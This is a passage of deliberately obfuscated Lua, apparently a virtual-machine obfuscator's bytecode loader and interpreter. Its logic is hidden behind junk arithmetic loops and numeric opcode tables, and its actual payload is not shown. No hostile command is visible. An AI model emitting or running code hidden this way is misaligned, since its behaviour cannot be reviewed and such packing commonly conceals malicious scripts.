bk=0 while true do if bk<=2 then if bk<=0 then if((cx>bf))then local bf=cw while true do bf=(bf+cu)if bf<ct then return bj else break end end end else if 1<bk then cy=((((cy+y))%x))else cx=(cx+cu)end end else if bk<=3 then if((cy%v)>w or(cy%v)==w)then local v=cw while true do v=((v+cu))if((v<cu)or(v==cu))then cy=((cy-ca)%s)else if not(not(v==bh))then break else return bj end end end else local s=cw while true do s=(s+cu)if not(not(s==ct))then break else return bi(be(bi,((be and bi)),bg,bj),((bj(bi,be,bg,bi)and bg(bj,bj and bi,bg,bi and bj))),bi(bg,bi,be,bi),bg(bg,bj,bg,bg))end end end else if bk~=5 then return be(bi(bg and bj,bg,(bg and be),(bj and bi)),bj(be,bi,bj,bi),bj(bj and bi,(bi and bi),bg,bi),be(bi,bj,bg,bj))else break end end end bk=bk+1 end end,function(s,v,w,x)local y=0 while true do if y<=2 then if y<=0 then if(cx>q)then local q=cw while true do q=(q+cu)if(q<ct)then return x else break end end end else if y~=2 then cx=cx+cu else cy=((cy*p)%d)end end else if y<=3 then if((cy%c)>b)then local b=cw while true do b=b+cu if(b<ct)then return s(w(x,s,s,((v and w))),s(s,w,v,(v and s))and x(v,x,x,v),v(s,x,s,(w and s)),w(s,w,s,w)and s(v,w,s,(s and x)))else break end end else local b=cw while true do b=(b+cu)if not(not(b==ct))then break else return v end end end else if 4==y then return x else break end end end y=y+1 end end)else if a<32 then return cy;else break end end end end end end a=a+1 end end)()));else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if a<1 then b,c=cf(),cf()else if(b==0 and c==0)then return 0;end;end else if 2==a then d=1 else p=((cd(c,1,20)*(2^32))+b)end end else if a<=5 then if 5~=a then q=cd(c,21,31)else s=((-1)^cd(c,32))end else if a<=6 then if(not(q~=0))then if(p==0)then return s*0;else q=1;d=0;end;elseif((q==2047))then if(not(p~=0))then return s*((1/0));else return(s*(0/0));end;end;else if a<8 then return(s*(2^(q-1023)))*(d+(p/(2^52)))else break end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if bd==30 then cm=function()local a,b,c=0 while true do if a<=1 then if a<1 then b,c=h(bn,br,(br+2))else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=br+2;else if 4~=a then return(bv(c,8))+b;else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if 33>bd then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if a>1 then d=0 else c=157 end end else if a<=3 then p={}else if a==4 then while(d<8)do d=(d+1);while(d<707 and c%1622<811)do c=((c*35))local q=d+c if((((c%16522))<8261))then c=(c*19)while((d<828)and c%658<329)do c=(((c+60)))local q=d+c if(not(((c%18428))~=9214)or(((c%18428))<9214))then c=(((c-50)))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not((q~=0))then return g;end;b=j(bn,br,(br+q-1));br=(br+q);return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if(0<v)then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end elseif(c%4~=0)then c=((c-67))local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if not(v==1)then return i(h(q))else break end v=v+1 end end end s=s+1 end end);end else c=((c*88))d=(d+1)local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s<2 then while true do if 1>v then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end end;d=((d+1));end elseif not(not((c%4)~=0))then c=((c-48))while((d<859)and c%1392<696)do c=((c*39))local q=((d+c))if(c%58)<29 then c=(((c+5)))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not(c%4~=0))then c=(c*56)local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if v>0 then break else return i(h(q))end v=(v+1)end else break end end s=s+1 end end);end else c=(((c*9)))d=(d+1)local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if(1~=v)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=d+1;end else c=(((c-51)))d=((d+1))while((d<663))and(((c%936)<468))do c=(((c*12)))local q=(d+c)if(((c%18532)>9266 or(c%18532)==9266))then c=(c*71)local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not((c%4)~=0))then c=((c-18))local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s~=2 then while true do if(1~=v)then return i(h(q))else break end v=(v+1)end else break end end s=s+1 end end);end else c=((c*35))d=(d+1)local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if 2>p then while true do if q==0 then return i(h(b))else break end q=(q+1)end else break end end p=p+1 end end);end end;d=d+1;end end;d=(d+1);end c=((c-494))if(d>43)then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if 1>a then return{...},n("\35",...)else break end a=a+1 end end else if 35==bd then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1>a then b,c,d,p={},{},{},{}else q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})end else if a<=2 then s={}else if 3==a then v=490 else w=0 end end end else if a<=6 then if 6>a then x={}else while w<3 do w=((w+1));while(w<481 and v%320<160)do v=((v*62))local d=(w+v)if((v%916)>458)then v=(((v-88)))while((w<318)and(v%702<351))do v=((v*8))local d=((w+v))if(v%14064)>7032 then v=((v*81))local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif v%4~=0 then v=((v*37))local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=(w+1)local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(not(j==1)))then s[d]=nil;elseif(not(not(j==2)))then s[d]=(not(not(cg()~=0)));elseif((not(j~=3)))then s[d]=ck();elseif(not(not(j==0)))then s[d]=co();end;end;q[cj]=s;end end;w=(w+1);end elseif not(((v%4)==0))then v=((v*65))while w<615 and v%618<309 do v=((v-33))local d=w+v if(((v%15582)>7791))then v=((v*14))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not((v%4==0))then v=(((v+51)))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+53)))w=(w+1)local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end else v=((v+7))w=w+1 while(w<127 and(v%1548<774))do v=(v-37)local d=((w+v))if(((v%19188)>9594))then v=(((v*61)))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(not((v%4)~=0))then v=(v+25)local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+42)))w=(w+1)local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end end;w=w+1;end v=((v*482))if w>56 then break;end;end;end else if a<=7 then v=939 else if 8==a then w=0 else x={}end end end end else if a<=14 then if a<=11 then if 10==a then while(w<7)do w=(w+1);while((w<520))and((v%910<455))do v=(v*66)local d=(w+v)if((((v%3944))>1972))then v=(v-7)while((w<198 and v%1546<773))do v=((v*67))local d=((w+v))if(((((v%17478)))>8739 or not(((v%17478))~=8739)))then v=(v-81)local d=98741 if not x[d]then x[d]=1;local d=1;local j=2;local p=3;local y=4;for y=1,cf()do local bb=cg();local be=cd(bb,d,d);if((not(not(be==0))))then local bb,be,bf=cd(bb,j,p),cd(bb,4,6),m({[226]=cm(),[898]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(bb,j,p);end,})if((((bb==0))or(not(bb~=d))))then bf[716]=cf();if((not(bb~=0)))then bf[585]=cf();end;elseif((bb==j))or(bb==p)then bf[716]=((cf()-(e)));if(not(bb~=p))then bf[585]=cm();end;end;if(not(not(cd(be,d,d)==d)))then bf[898]=s[bf[898]];end;if(not(not(cd(be,j,j)==d)))then bf[716]=s[bf[716]];end;if(not(not((cd(be,p,p)==d))))then bf[585]=s[bf[585]];end;b[y]=bf;end;end;end elseif not(not((v%4)~=0))then v=((v*38))local b=65711 if not x[b]then x[b]=1;end else v=(v+35)w=(w+1)local b=66243 if not x[b]then x[b]=1;end end;w=w+1;end elseif not(((v%4)==0))then v=(((v+57)))while(w<438 and(v%1424<712))do v=((v+80))local b=w+v if(v%17122)<8561 then v=((v+96))local b=18761 if not x[b]then x[b]=1;end elseif not(not(v%4~=0))then v=((v-22))local b=16821 if not x[b]then x[b]=1;end else v=((v*97))w=(w+1)local b=23215 if not x[b]then x[b]=1;end end;w=w+1;end else v=(((v+81)))w=(w+1)while(((w<385)and((v%386)<193)))do v=(((v-96)))local b=(w+v)if((v%8040)<=4020)then v=(v+23)local b=31635 if not x[b]then x[b]=1;end elseif not(not((v%4)~=0))then v=((v*48))local b=38415 if not x[b]then x[b]=1;end else v=(v*44)w=(w+1)local b=63682 if not x[b]then x[b]=1;end end;w=w+1;end end;w=((w+1));end v=(v*839)if((w>84))then break;end;end;else q[481]=cg();end else if a<=12 then for b=1,cf()do c[(b-1)]=cr();end;else if a==13 then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[898],b[716],b[585]if(not(bp(c)~=f))then c=z(c,cl,function(j,p,p,p)local p,s=0 while true do if p<=0 then s=0 else if p>1 then break else while true do if(1>s)then return i(bu(h(j),cb))else break end s=(s+1)end end end p=p+1 end end)b[898]=c end if((bp(d)==f))then d=z(d,cl,function(c,j,j)local j,p=0 while true do if j<=0 then p=0 else if 2>j then while true do if 0<p then break else return i(bu(h(c),cb))end p=p+1 end else break end end j=j+1 end end)b[716]=d end if not(bp(e)~=f)then e=z(e,cl,function(c,d,d,d,d)local d,j=0 while true do if d<=0 then j=0 else if d<2 then while true do if(j<1)then return i(bu(h(c),cb))else break end j=(j+1)end else break end end d=d+1 end end)b[585]=e end;end;q[cj]=nil;end;else v=308 end end end else if a<=16 then if 16>a then w=0 else x={}end else if a<=17 then while(w<6)do w=w+1;while(((w<769))and(v%942<471))do v=((v+6))local b=(w+v)if(((v%8070))==4035 or((v%8070))>4035)then v=((v-78))while((w<409 and(v%524<262)))do v=((v+20))local b=((w+v))if(((v%11576))>5788)then v=(v+47)local b=39248 if not x[b]then x[b]=1;return q end elseif(not((v%4)==0))then v=(((v-42)))local b=57099 if not x[b]then x[b]=1;end else v=((v+80))w=(w+1)local b=3805 if not x[b]then x[b]=1;return q end end;w=(w+1);end elseif not(not((v%4)~=0))then v=(v-90)while((w<467)and(v%492)<246)do v=(v*61)local b=w+v if(((v%19730)<9865)or not((v%19730)~=9865))then v=((v*53))local b=92609 if not x[b]then x[b]=1;return q end elseif not(not((v%4)~=0))then v=((v*72))local b=24891 if not x[b]then x[b]=1;return q end else v=((v-29))w=(w+1)local b=15996 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if b<2 then while true do if(c==2 or c<2)then if(c==0 or c<0)then d=n(1,...)else if c~=2 then e=({...})else do for d=0,#e do if(bp(e[d])==bq)then for i,i in o,e[d]do if(not(bp(i)~=bp(g)))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c<3 or c==3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if 2~=i then while true do if(j<1 or j==1)then if not(0~=j)then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if not(2~=j)then return false else break end end j=j+1 end else break end end i=i+1 end end else if 4==c then for d=0,#e do if not(bp(e[d])~=bq)then return h(e[d])end end else break end end end c=(c+1)end else break end end b=b+1 end end end end;w=(w+1);end else v=(v-20)w=((w+1))while(w<262 and(v%812<406))do v=((v-80))local b=(w+v)if((v%10388)<=5194)then v=((v+95))local b=47428 if not x[b]then x[b]=1;return q end elseif not(not(((v%4))~=0))then v=((v+81))local b=93589 if not x[b]then x[b]=1;return q end else v=(v-10)w=w+1 local b=61395 if not x[b]then x[b]=1;return q end end;w=(w+1);end end;w=w+1;end v=(v-559)if(w>32)then break;end;end;else if a<19 then return q;else break end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[226];if z<=185 then if z<=92 then if z<=45 then if z<=22 then if z<=10 then if(4>=z)then if(z<1 or z==1)then if not(0~=z)then local ba=y[898];local bb=w[ba];for bc=(ba+1),y[716]do t(bb,w[bc])end;else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[898]]=w[y[716]][y[585]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[898]]=y[716];end else if 6==ba then y=f[n];else w[y[898]]=y[716];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if ba<11 then w[y[898]]=y[716];else n=n+1;end end else if ba<=13 then if 13~=ba then y=f[n];else bb=y[898]end else if ba>14 then break else w[bb]=w[bb](r(w,bb+1,y[716]))end end end end ba=ba+1 end end;elseif z<=2 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba~=4 then w[y[898]]=j[y[716]];else n=n+1;end end end else if ba<=6 then if ba==5 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end else if ba<=7 then n=n+1;else if ba>8 then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[898]]=w[y[716]][y[585]];else if 14>ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba~=16 then bd=y[898]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif z~=4 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[898]]=h[y[716]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[898]]=h[y[716]];end else if ba<=7 then n=n+1;else if ba>8 then w[y[898]]=w[y[716]][y[585]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[898]]=w[y[716]][w[y[585]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[898]end else if ba<=17 then bb=0;else if 18<ba then break else for be=bd,y[585]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end else local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0<ba then n=n+1;else w[y[898]]=w[y[716]][y[585]];end else if 2==ba then y=f[n];else w[y[898]][y[716]]=w[y[585]];end end else if ba<=5 then if ba>4 then y=f[n];else n=n+1;end else if 6<ba then n=n+1;else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=11 then if ba<=9 then if 9>ba then y=f[n];else w[y[898]]=h[y[716]];end else if ba<11 then n=n+1;else y=f[n];end end else if ba<=13 then if ba==12 then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=14 then y=f[n];else if 16>ba then if(w[y[898]]~=w[y[585]])then n=n+1;else n=y[716];end;else break end end end end end ba=ba+1 end end;elseif z<=7 then if(z<=5)then w[y[898]]=w[y[716]]-y[585];elseif(6<z)then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba==0 then bb=nil else w={};end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if ba~=4 then n=n+1;else y=f[n];end end end else if ba<=7 then if ba<=5 then w[y[898]]=h[y[716]];else if ba<7 then n=n+1;else y=f[n];end end else if ba<=8 then w[y[898]]=w[y[716]][y[585]];else if 9==ba then n=n+1;else y=f[n];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then w[y[898]]=h[y[716]];else if 12==ba then n=n+1;else y=f[n];end end else if ba<=14 then w[y[898]]=h[y[716]];else if 16~=ba then n=n+1;else y=f[n];end end end else if ba<=19 then if ba<=17 then w[y[898]]=w[y[716]][w[y[585]]];else if 19~=ba then n=n+1;else y=f[n];end end else if ba<=20 then bb=y[898]else if ba<22 then w[bb](w[bb+1])else break end end end end end ba=ba+1 end else w[y[898]]=y[716];end;elseif(8>=z)then local ba=0 while true do if ba<=18 then if ba<=8 then if ba<=3 then if ba<=1 then if 1>ba then w[y[898]]=j[y[716]];else n=n+1;end else if 3>ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if ba<=5 then if ba==4 then n=n+1;else y=f[n];end else if ba<=6 then w[y[898]]=j[y[716]];else if ba==7 then n=n+1;else y=f[n];end end end end else if ba<=13 then if ba<=10 then if 9<ba then n=n+1;else w[y[898]]=j[y[716]];end else if ba<=11 then y=f[n];else if 12<ba then n=n+1;else w[y[898]]=j[y[716]];end end end else if ba<=15 then if ba>14 then w[y[898]]=j[y[716]];else y=f[n];end else if ba<=16 then n=n+1;else if ba==17 then y=f[n];else w[y[898]]=j[y[716]];end end end end end else if ba<=27 then if ba<=22 then if ba<=20 then if ba<20 then n=n+1;else y=f[n];end else if ba~=22 then w[y[898]]=j[y[716]];else n=n+1;end end else if ba<=24 then if ba==23 then y=f[n];else w[y[898]]=j[y[716]];end else if ba<=25 then n=n+1;else if 27>ba then y=f[n];else w[y[898]]=j[y[716]];end end end end else if ba<=32 then if ba<=29 then if ba~=29 then n=n+1;else y=f[n];end else if ba<=30 then w[y[898]]={};else if ba==31 then n=n+1;else y=f[n];end end end else if ba<=34 then if 33==ba then w[y[898]]=w[y[716]][y[585]];else n=n+1;end else if ba<=35 then y=f[n];else if ba<37 then if not w[y[898]]then n=n+1;else n=y[716];end;else break end end end end end end ba=ba+1 end elseif not(10==z)then w[y[898]]=(w[y[716]]-y[585]);else local ba=y[716];local bb=y[585];local ba=k(w,g,ba,bb);w[y[898]]=ba;end;elseif 16>=z then if z<=13 then if(z<=11)then local ba,bb,bc=0 while true do if ba<=24 then if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then bc=nil else w[y[898]]={};end end else if ba<=3 then n=n+1;else if 5~=ba then y=f[n];else w[y[898]]=h[y[716]];end end end else if ba<=8 then if ba<=6 then n=n+1;else if 7==ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if ba<=9 then n=n+1;else if 11~=ba then y=f[n];else w[y[898]]=h[y[716]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then n=n+1;else if 14>ba then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end else if ba<=15 then n=n+1;else if ba~=17 then y=f[n];else w[y[898]]=w[y[716]][y[585]];end end end else if ba<=20 then if ba<=18 then n=n+1;else if ba==19 then y=f[n];else w[y[898]]={};end end else if ba<=22 then if 22>ba then n=n+1;else y=f[n];end else if ba==23 then w[y[898]]={};else n=n+1;end end end end end else if ba<=37 then if ba<=30 then if ba<=27 then if ba<=25 then y=f[n];else if 27~=ba then w[y[898]]=h[y[716]];else n=n+1;end end else if ba<=28 then y=f[n];else if ba==29 then w[y[898]][y[716]]=w[y[585]];else n=n+1;end end end else if ba<=33 then if ba<=31 then y=f[n];else if ba<33 then w[y[898]]=h[y[716]];else n=n+1;end end else if ba<=35 then if 34==ba then y=f[n];else w[y[898]][y[716]]=w[y[585]];end else if 36==ba then n=n+1;else y=f[n];end end end end else if ba<=43 then if ba<=40 then if ba<=38 then w[y[898]][y[716]]=w[y[585]];else if ba==39 then n=n+1;else y=f[n];end end else if ba<=41 then w[y[898]]={r({},1,y[716])};else if ba~=43 then n=n+1;else y=f[n];end end end else if ba<=46 then if ba<=44 then w[y[898]]=w[y[716]];else if ba==45 then n=n+1;else y=f[n];end end else if ba<=48 then if ba==47 then bc=y[898];else bb=w[bc];end else if 49==ba then for bd=bc+1,y[716]do t(bb,w[bd])end;else break end end end end end end ba=ba+1 end elseif z<13 then local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then w[y[898]][y[716]]=y[585];else n=n+1;end else if ba<=2 then y=f[n];else if ba<4 then w[y[898]]={};else n=n+1;end end end else if ba<=6 then if 5<ba then w[y[898]][y[716]]=w[y[585]];else y=f[n];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[898]]=h[y[716]];end end end end else if ba<=14 then if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<=12 then w[y[898]]=w[y[716]][y[585]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if 15==ba then w[y[898]][y[716]]=w[y[585]];else n=n+1;end else if ba<=17 then y=f[n];else if ba<19 then w[y[898]][y[716]]=w[y[585]];else break end end end end end ba=ba+1 end else w[y[898]]=(w[y[716]]%w[y[585]]);end;elseif z<=14 then local ba=y[898];local bb=w[ba];for bc=ba+1,p do t(bb,w[bc])end;elseif z~=16 then w[y[898]]=w[y[716]];else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif 19>=z then if z<=17 then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif 19~=z then local ba=y[898]local bb,bc=i(w[ba](w[ba+1]))p=bc+ba-1 local bc=0;for bd=ba,p do bc=bc+1;w[bd]=bb[bc];end;else w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];if(w[y[898]]~=y[585])then n=n+1;else n=y[716];end;end;elseif z<=20 then local ba;w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898];do return w[ba](r(w,ba+1,y[716]))end;n=n+1;y=f[n];ba=y[898];do return r(w,ba,p)end;n=n+1;y=f[n];n=y[716];elseif 22>z then local ba=y[898]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if be>=ba then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end else local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=33 then if z<=27 then if 24>=z then if z==23 then w[y[898]]=j[y[716]];else local ba;w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))end;elseif z<=25 then local ba;w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=y[585];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))elseif z==26 then local ba=y[898]w[ba]=w[ba](r(w,ba+1,p))else if(y[898]<=w[y[585]])then n=n+1;else n=y[716];end;end;elseif z<=30 then if 28>=z then w[y[898]]=#w[y[716]];elseif 29<z then local ba;w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=y[585];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=31 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]]={};n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;elseif 33~=z then w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];if w[y[898]]then n=n+1;else n=y[716];end;else local ba;w[y[898]]={};n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]][y[716]]=w[y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=j[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba]()end;elseif 39>=z then if z<=36 then if 34>=z then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[898]]=h[y[716]];end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if ba<5 then w[y[898]]=y[716];else n=n+1;end else if ba>6 then w[y[898]]=y[716];else y=f[n];end end end else if ba<=11 then if ba<=9 then if ba==8 then n=n+1;else y=f[n];end else if ba<11 then w[y[898]]=y[716];else n=n+1;end end else if ba<=13 then if 13~=ba then y=f[n];else bb=y[898]end else if ba>14 then break else w[bb]=w[bb](r(w,bb+1,y[716]))end end end end ba=ba+1 end elseif 35==z then local ba;w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];w[y[898]]=w[y[716]];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];w[y[898]]=y[716];n=n+1;y=f[n];ba=y[898]w[ba]=w[ba](r(w,ba+1,y[716]))else w[y[898]]=w[y[716]]%y[585];end;elseif z<=37 then local ba=y[898];local bb,bc,bd=w[ba],w[ba+1],w[ba+2];local bb=bb+bd;w[ba]=bb;if bd>0 and bb<=bc or bd<0 and bb>=bc then n=y[716];w[ba+3]=bb;end;elseif z>38 then if(w[y[898]]~=y[585])then n=n+1;else n=y[716];end;else local ba;local bb;local bc;w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=h[y[716]];n=n+1;y=f[n];w[y[898]]=w[y[716]][y[585]];n=n+1;y=f[n];w[y[898]]=w[y[716]][w[y[585]]];n=n+1;y=f[n];bc=y[898]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[585]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=42 then if 40>=z then local ba=y[898]w[ba]=w[ba]()elseif 41==z then w[y[898]][w[y[716]]]=w[y[585]];else w[y[898]]=w[y[716]]*y[585];end;elseif 43>=z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else 